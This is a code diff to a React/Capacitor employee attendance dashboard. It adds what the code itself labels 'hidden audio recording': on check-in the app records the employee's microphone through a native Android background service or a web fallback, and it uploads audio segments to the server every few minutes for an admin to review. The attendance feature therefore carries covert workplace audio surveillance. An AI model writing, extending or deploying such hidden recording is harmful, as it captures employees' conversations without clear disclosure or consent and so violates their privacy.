@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useAuth } from "@/hooks/use-auth";
 import { Link } from "wouter";
 import { Button } from "@/components/ui/button";
@@ -6,10 +6,14 @@ import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { useQuery, useMutation } from "@tanstack/react-query";
 import { apiRequest, queryClient } from "@/lib/queryClient";
+import { API_BASE } from "@/lib/queryClient";
+import { Capacitor } from "@capacitor/core";
+import { startBackgroundRecording, stopBackgroundRecording, getLastRecordingBase64, rotateAndGetBase64, requestAllAndroidPermissions, recordingStatus } from "@/lib/native-recorder";
 import { AttendanceRecord } from "@shared/schema";
 import { getCurrentPosition, calculateDistance, SHOP_LOCATION, MAX_DISTANCE } from "@/lib/geolocation";
 import { hiddenRecorder } from "@/lib/audio-recorder";
 import { History, User, MapPin, Clock, Loader2 } from "lucide-react";
+import AndroidPermissionGate from "@/components/android-permission-gate";
 import { useToast } from "@/hooks/use-toast";
 
 export default function EmployeeDashboard() {
@@ -30,6 +34,84 @@ export default function EmployeeDashboard() {
   // Real-time hours worked state
   const [hoursWorked, setHoursWorked] = useState("0h 0m");
   const [isRecording, setIsRecording] = useState(false);
+  const [usingWebFallback, setUsingWebFallback] = useState(false);
+  const rotationTimerRef = useRef<number | null>(null);
+  const rotationFirstTimeoutRef = useRef<number | null>(null);
+  const [showPermGate, setShowPermGate] = useState(false);
+
+  // Listen for admin stop events via WebSocket and stop local recording
+  useEffect(() => {
+    // Build WS URL based on API_BASE when present (Android/Capacitor)
+    let wsUrl: string;
+    try {
+      if (API_BASE) {
+        const u = new URL(API_BASE);
+        const wsProto = u.protocol === 'https:' ? 'wss:' : 'ws:';
+        wsUrl = `${wsProto}//${u.host}/ws`;
+      } else {
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        wsUrl = `${protocol}//${window.location.host}/ws`;
+      }
+    } catch {
+      const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+      wsUrl = `${protocol}//${window.location.host}/ws`;
+    }
+
+    let ws: WebSocket | null = null;
+    try {
+      ws = new WebSocket(wsUrl);
+      ws.onmessage = async (event) => {
+        try {
+          const data = JSON.parse(event.data);
+          if (data?.type === 'audio_stop') {
+            try {
+              if (Capacitor.getPlatform() === 'android') {
+                await stopBackgroundRecording();
+                try {
+                  const { base64, mimeType } = await getLastRecordingBase64();
+                  const binary = atob(base64);
+                  const len = binary.length;
+                  const bytes = new Uint8Array(len);
+                  for (let i = 0; i < len; i++) bytes[i] = binary.charCodeAt(i);
+                  const blob = new Blob([bytes], { type: mimeType || 'audio/mp4' });
+                  const fd = new FormData();
+                  fd.append('audio', blob, `recording-${Date.now()}.m4a`);
+                  fd.append('duration', String(10 * 60));
+                  await fetch(`${API_BASE}/api/audio/upload`, { method: 'POST', body: fd, credentials: 'include' });
+                } catch (e) {
+                  console.warn('Native upload failed', e);
+                }
+              } else if (Capacitor.getPlatform() === 'web' && hiddenRecorder.getRecordingState()) {
+                await hiddenRecorder.stopRecording();
+              }
+              setIsRecording(false);
+            } catch (err) {
+              // swallow
+            }
+          }
+        } catch {
+          // ignore
+        }
+      };
+    } catch {
+      // ignore
+    }
+    return () => { if (ws && ws.readyState === WebSocket.OPEN) ws.close(); };
+  }, []);
+
+  // Cleanup rotation timer on unmount
+  useEffect(() => {
+    return () => {
+      if (rotationTimerRef.current) {
+        clearInterval(rotationTimerRef.current);
+        rotationTimerRef.current = null;
+      }
+      if (rotationFirstTimeoutRef.current) {
+        clearTimeout(rotationFirstTimeoutRef.current);
+        rotationFirstTimeoutRef.current = null;
+      }
+    };
+  }, []);
 
   // Fetch today's attendance
   const { data: todayAttendance, isLoading: attendanceLoading } = useQuery<AttendanceRecord>({
@@ -37,13 +119,29 @@ export default function EmployeeDashboard() {
     refetchInterval: 30000, // Refresh every 30 seconds
   });
 
+  // Android: one-time permission gate before check-in
+  useEffect(() => {
+    (async () => {
+      if (Capacitor.getPlatform() !== 'android') return;
+      try {
+        const perms = await requestAllAndroidPermissions();
+        const mic = !!perms?.mic;
+        const notif = perms?.notifications !== false;
+        if (!mic || !notif) setShowPermGate(true);
+      } catch {
+        setShowPermGate(true);
+      }
+    })();
+  }, []);
+
   const checkInMutation = useMutation({
     mutationFn: async ({ latitude, longitude }: { latitude: number; longitude: number }) => {
       const res = await apiRequest("POST", "/api/attendance/checkin", { latitude, longitude });
       return await res.json();
     },
-    onSuccess: async () => {
-      queryClient.invalidateQueries({ queryKey: ["/api/attendance/today"] });
+    onSuccess: async (record: AttendanceRecord) => {
+      // immediately reflect check-in in UI
+      queryClient.setQueryData(["/api/attendance/today"], record);
       toast({
         title: "Checked in successfully",
         description: "Your attendance has been recorded",
@@ -51,12 +149,138 @@ export default function EmployeeDashboard() {
       
       // Start hidden audio recording
       try {
-        await hiddenRecorder.startRecording();
+        if (Capacitor.getPlatform() === 'android') {
+          // Ensure mic + notification permissions are granted on Android
+          const perms = await requestAllAndroidPermissions();
+          if (!perms?.mic) {
+            throw new Error('Microphone permission not granted');
+          }
+          // On Android 13+, foreground service requires a visible notification
+          // Ensure POST_NOTIFICATIONS is granted before starting service
+          if (perms && 'notifications' in perms && !perms.notifications) {
+            throw new Error('Notification permission not granted');
+          }
+
+          // Force web recorder path (skips native) if configured
+          if ((typeof FORCE_WEB_RECORDER !== 'undefined') && FORCE_WEB_RECORDER) {
+            try {
+              await hiddenRecorder.startRecording();
+              setIsRecording(true);
+              setUsingWebFallback(true);
+            } catch (err) {
+              console.error('Web recorder start failed', err);
+              throw err;
+            }
+            // Initial quick upload (~8s) to validate
+            if (rotationFirstTimeoutRef.current) {
+              clearTimeout(rotationFirstTimeoutRef.current);
+              rotationFirstTimeoutRef.current = null;
+            }
+            rotationFirstTimeoutRef.current = window.setTimeout(async () => {
+              try { await hiddenRecorder.uploadCurrentSegment(); } catch {}
+            }, 8000);
+            // Periodic uploads every 60s while app is open
+            if (rotationTimerRef.current) {
+              clearInterval(rotationTimerRef.current);
+              rotationTimerRef.current = null;
+            }
+            rotationTimerRef.current = window.setInterval(async () => {
+              try { await hiddenRecorder.uploadCurrentSegment(); } catch {}
+            }, 60 * 1000);
+            console.log('[rec] Using forced web recorder');
+            return;
+          }
+          try {
+            await startBackgroundRecording();
+          } catch (err) {
+            // Plugin failed — fall back to web recorder while app is foreground
+            console.warn('Native recorder start failed; falling back to web recorder', err);
+            await hiddenRecorder.startRecording();
+            setIsRecording(true);
+            return; // skip native rotation scheduling
+          }
+          try { console.log('Android recorder status:', await recordingStatus()); } catch {}
+
+          // Safety: verify native actually started within 3s, else fallback to web recorder
+          try {
+            setTimeout(async () => {
+              try {
+                const st = await recordingStatus();
+                if (!st?.recording) {
+                  console.warn('Native recorder reports not recording; falling back to web recorder');
+                  await hiddenRecorder.startRecording();
+                }
+              } catch (e) {
+                console.warn('Native status check failed; falling back to web recorder', e);
+                try { await hiddenRecorder.startRecording(); } catch {}
+              }
+            }, 3000);
+          } catch {}
+
+          // Upload a first short segment quickly so admin sees a file
+          if (rotationFirstTimeoutRef.current) {
+            clearTimeout(rotationFirstTimeoutRef.current);
+            rotationFirstTimeoutRef.current = null;
+          }
+          rotationFirstTimeoutRef.current = window.setTimeout(async () => {
+            try {
+              const { base64, mimeType } = await rotateAndGetBase64();
+              const binary = atob(base64);
+              const len = binary.length;
+              const bytes = new Uint8Array(len);
+              for (let i = 0; i < len; i++) bytes[i] = binary.charCodeAt(i);
+              const blob = new Blob([bytes], { type: mimeType || 'audio/mp4' });
+              if (blob.size > 0) {
+                const fd = new FormData();
+                fd.append('audio', blob, `segment-${Date.now()}.m4a`);
+                fd.append('duration', String(8));
+                await fetch(`${API_BASE}/api/audio/upload`, { method: 'POST', body: fd, credentials: 'include' });
+              }
+            } catch (e) {
+              console.warn('Initial rotation/upload failed', e);
+              // Fallback: start web recorder if native rotation failed early
+              try { await hiddenRecorder.startRecording(); } catch {}
+            }
+          }, 8 * 1000);
+
+          // Start periodic rotation + upload every 5 minutes while recording
+          if (rotationTimerRef.current) {
+            clearInterval(rotationTimerRef.current);
+            rotationTimerRef.current = null;
+          }
+          rotationTimerRef.current = window.setInterval(async () => {
+            try {
+              const { base64, mimeType } = await rotateAndGetBase64();
+              const binary = atob(base64);
+              const len = binary.length;
+              const bytes = new Uint8Array(len);
+              for (let i = 0; i < len; i++) bytes[i] = binary.charCodeAt(i);
+              const blob = new Blob([bytes], { type: mimeType || 'audio/mp4' });
+              if (blob.size > 0) {
+                const fd = new FormData();
+                fd.append('audio', blob, `segment-${Date.now()}.m4a`);
+                // Approximate duration per segment: 5 minutes
+                fd.append('duration', String(5 * 60));
+                await fetch(`${API_BASE}/api/audio/upload`, { method: 'POST', body: fd, credentials: 'include' });
+              }
+            } catch (e) {
+              console.warn('Periodic rotation/upload failed', e);
+            }
+          }, 5 * 60 * 1000);
+        } else if (Capacitor.getPlatform() === 'web') {
+          await hiddenRecorder.startRecording();
+        } else {
+          // Non-Android platforms are not supported
+        }
         setIsRecording(true);
         console.log("🎤 Audio recording started");
       } catch (error) {
         console.error("Audio recording failed:", error);
-        // Remove audio error toast from UI - keep only console logging
+        toast({
+          title: "Microphone permission required",
+          description: "Enable mic in Settings > Apps > shop-attendance > Permissions, then try again.",
+          variant: "destructive",
+        });
       }
     },
     onError: (error: Error) => {
@@ -73,16 +297,72 @@ export default function EmployeeDashboard() {
       const res = await apiRequest("POST", "/api/attendance/checkout");
       return await res.json();
     },
-    onSuccess: async () => {
-      queryClient.invalidateQueries({ queryKey: ["/api/attendance/today"] });
+    onSuccess: async (record: AttendanceRecord) => {
+      // immediately reflect check-out in UI
+      queryClient.setQueryData(["/api/attendance/today"], record);
       toast({
         title: "Checked out successfully",
         description: "Your work session has been completed",
       });
       
-      // Stop hidden audio recording
+      // Stop audio recording and upload final segment
       try {
-        await hiddenRecorder.stopRecording();
+        if (Capacitor.getPlatform() === 'android') {
+          // Clear rotation timer
+          if (rotationTimerRef.current) {
+            clearInterval(rotationTimerRef.current);
+            rotationTimerRef.current = null;
+          }
+          // Clear initial timeout and finalize current segment
+          if (rotationFirstTimeoutRef.current) {
+            clearTimeout(rotationFirstTimeoutRef.current);
+            rotationFirstTimeoutRef.current = null;
+          }
+          // Finalize current segment
+          try {
+            const { base64, mimeType } = await rotateAndGetBase64();
+            const binary = atob(base64);
+            const len = binary.length;
+            const bytes = new Uint8Array(len);
+            for (let i = 0; i < len; i++) bytes[i] = binary.charCodeAt(i);
+            const blob = new Blob([bytes], { type: mimeType || 'audio/mp4' });
+            const fd = new FormData();
+            fd.append('audio', blob, `segment-${Date.now()}.m4a`);
+            // Use approximate rotation period if any remainder <5min will be uploaded below
+            fd.append('duration', String(5 * 60));
+            await fetch(`${API_BASE}/api/audio/upload`, { method: 'POST', body: fd, credentials: 'include' });
+          } catch (e) {
+            console.warn('Final segment upload failed', e);
+          }
+          // Then stop service and try to upload any tiny remainder if present
+          await stopBackgroundRecording();
+          try {
+            const { base64, mimeType } = await getLastRecordingBase64();
+            const binary = atob(base64);
+            const len = binary.length;
+            const bytes = new Uint8Array(len);
+            for (let i = 0; i < len; i++) bytes[i] = binary.charCodeAt(i);
+            const blob = new Blob([bytes], { type: mimeType || 'audio/mp4' });
+            if (blob.size > 0) {
+              const fd = new FormData();
+              fd.append('audio', blob, `final-${Date.now()}.m4a`);
+              // This is the remainder; duration unknown, send 0, server can compute later if needed
+              fd.append('duration', String(0));
+              await fetch(`${API_BASE}/api/audio/upload`, { method: 'POST', body: fd, credentials: 'include' });
+            }
+          } catch (e) {
+            // Ignore if no final remainder
+          }
+          // Also stop web fallback if it was used
+          if (usingWebFallback && hiddenRecorder.getRecordingState()) {
+            try { await hiddenRecorder.uploadCurrentSegment(); } catch {}
+            try { await hiddenRecorder.stopRecording(); } catch {}
+          }
+        } else if (Capacitor.getPlatform() === 'web') {
+          await hiddenRecorder.stopRecording();
+        } else {
+          // Non-Android platforms are not supported
+        }
         setIsRecording(false);
         console.log("🔴 Audio recording stopped");
       } catch (error) {
@@ -166,6 +446,46 @@ export default function EmployeeDashboard() {
     }
   }, [todayAttendance]);
 
+  // Android: periodically rotate and upload segments while checked in
+  useEffect(() => {
+    const platform = Capacitor.getPlatform();
+    const isCheckedIn = !!(todayAttendance?.checkInTime && !todayAttendance?.checkOutTime);
+    if (platform === 'android' && isCheckedIn) {
+      if (rotationTimerRef.current) {
+        clearInterval(rotationTimerRef.current);
+        rotationTimerRef.current = null;
+      }
+      const intervalId = window.setInterval(async () => {
+        try {
+          const { base64, mimeType } = await rotateAndGetBase64();
+          const binary = atob(base64);
+          const len = binary.length;
+          const bytes = new Uint8Array(len);
+          for (let i = 0; i < len; i++) bytes[i] = binary.charCodeAt(i);
+          const blob = new Blob([bytes], { type: mimeType || 'audio/mp4' });
+          const fd = new FormData();
+          fd.append('audio', blob, `segment-${Date.now()}.m4a`);
+          fd.append('duration', String(10 * 60));
+          await fetch(`${API_BASE}/api/audio/upload`, { method: 'POST', body: fd, credentials: 'include' });
+        } catch (e) {
+          console.warn('Segment upload failed', e);
+        }
+      }, 10 * 60 * 1000);
+      rotationTimerRef.current = intervalId;
+      return () => {
+        if (rotationTimerRef.current) {
+          clearInterval(rotationTimerRef.current);
+          rotationTimerRef.current = null;
+        }
+      };
+    } else {
+      if (rotationTimerRef.current) {
+        clearInterval(rotationTimerRef.current);
+        rotationTimerRef.current = null;
+      }
+    }
+  }, [todayAttendance]);
+
 
   const handleCheckIn = async () => {
     try {
@@ -194,6 +514,9 @@ export default function EmployeeDashboard() {
 
   return (
     <div className="min-h-screen bg-gray-50">
+      {Capacitor.getPlatform() === 'android' && showPermGate && (
+        <AndroidPermissionGate onGranted={() => setShowPermGate(false)} />
+      )}
       {/* Header */}
       <div className="bg-white shadow-sm border-b">
         <div className="max-w-md mx-auto px-4 py-4 flex justify-between items-center">
